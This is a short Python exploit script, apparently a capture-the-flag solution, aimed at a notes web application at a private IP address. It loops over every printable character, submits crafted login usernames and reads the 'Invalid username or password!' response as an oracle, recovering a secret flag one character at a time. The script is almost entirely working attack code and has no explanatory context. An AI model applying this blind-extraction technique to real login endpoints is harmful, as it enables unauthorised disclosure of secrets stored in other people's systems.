import string
import requests

URL = "http://10.113.184.121:10082/"

import json

SESSION = requests.Session()  # Already login


def create_note(title, content):
    r = SESSION.post(URL + "api/notes", json={"title": title, "content": content})
    return json.loads(r.text)["id"]


def login(username, password):
    r = requests.post(URL + "login", data={"username": username, "password": password})
    return "Invalid username or password!" in r.text


NONCE = "4_R@ND0M_Str1ng!"  # at most 15
PASSWORD_B = "BBBBB"
L = 32
S = string.printable

flag = ""
for i in range(L):
    for s in S:
        if login(f"{i}_{NONCE}_{ord(s)}", PASSWORD_B):
            flag += s
            break
    else:
        break

print(flag)
